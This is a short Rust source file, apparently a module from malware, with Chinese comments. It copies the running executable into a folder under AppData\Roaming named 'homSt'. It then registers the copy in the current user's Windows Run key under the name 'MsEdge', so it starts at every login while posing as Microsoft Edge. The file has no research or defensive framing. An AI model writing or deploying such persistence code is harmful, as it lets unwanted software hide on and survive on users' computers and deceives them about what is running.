use std::env;
use std::fs;
use dirs::home_dir;
use winreg::enums::*;
use winreg::RegKey;

pub fn self_copy() {
    // 获取自身路径
    let current_exe = env::current_exe().expect("Failed to get current executable path");

    // 目标文件夹路径
    let mut target_dir = home_dir().expect("Failed to get home directory");
    target_dir.push("AppData\\Roaming\\homSt");


    if !current_exe.starts_with(&target_dir) {

        fs::create_dir_all(&target_dir).expect("Failed to create target directory");


        let mut target_exe = target_dir.clone();
        target_exe.push(current_exe.file_name().expect("Failed to get executable file name"));

        // 复制自身到目标文件夹
        fs::copy(&current_exe, &target_exe).expect("Failed to copy executable");

        let target_exe_str = target_exe.to_str().expect("Failed to convert target executable path to string");

        // 添加启动项
        add_startup_entry("MsEdge", target_exe_str);
    }

    
}

pub fn add_startup_entry(name: &str, path: &str) {

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    let (key, _) = hkcu.create_subkey(path_key).expect("Failed to open registry key");

    key.set_value(name, &path).expect("Failed to set registry value");
}
